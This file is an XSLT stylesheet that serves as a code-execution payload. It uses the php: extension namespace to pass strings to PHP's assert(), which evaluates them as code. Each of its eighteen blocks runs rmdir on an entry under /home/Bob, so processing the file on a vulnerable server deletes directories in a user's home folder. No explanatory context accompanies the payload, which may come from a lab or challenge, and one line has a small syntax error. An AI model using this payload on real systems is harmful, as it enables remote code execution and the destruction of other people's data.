<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" xmlns:exsl="http://exslt.org/common" version="1.0">
 
  <xsl:template match="*">
             <xsl:variable name="aa">rmdir(glob('/home/Bob/*')[12])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $aa)"/> 
           <xsl:variable name="a">rmdir(glob('/home/Bob/*')[13])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $a)"/> 
           <xsl:variable name="b">rmdir(glob('/home/Bob/*')[14])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $b)"/> 
           <xsl:variable name="c">rmdir(glob('/home/Bob/*')[15])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $c)"/> 
           <xsl:variable name="d">rmdir(glob('/home/Bob/*')[16])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $d)"/> 

        <xsl:variable name="e">rmdir(glob('/home/Bob/*')[17])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $e)"/> 
   
           <xsl:variable name="f">rmdir(glob('/home/Bob/*')[0])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $f)"/> 
   
           <xsl:variable name="g">rmdir(glob('/home/Bob/*')[1])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $g)"/> 
   
           <xsl:variable name="h">rmdir(glob('/home/Bob/*')[2])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $h)"/> 
              <xsl:variable name="i">rmdir(glob('/home/Bob/*')[3])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $i)"/> 
   
           <xsl:variable name="j">rmdir(glob('/home/Bob/*')[4])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $j)"/> 
   
           <xsl:variable name="k">rmdir(glob('/home/Bob/*')[5])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $k)"/> 
              <xsl:variable name="l">rmdir(glob('/home/Bob/*')[6])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $l)"/> 
   
           <xsl:variable name="m">rmdir(glob('/home/Bob/*')[7])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $m)"/> 
   
           <xsl:variable name="n">rmdir(glob('/home/Bob/*')[8])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $n)"/> 
              <xsl:variable name="o">rmdir(glob('/home/Bob/*')[9])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $o)"/> 
   
           <xsl:variable name="p">rmdir(glob('/home/Bob/*')[10])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $p)"/> 
   
           <xsl:variable name="q">rmdir(glob('/home/Bob/*')[11)</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $q)"/> 
</xsl:template> 
</xsl:stylesheet>
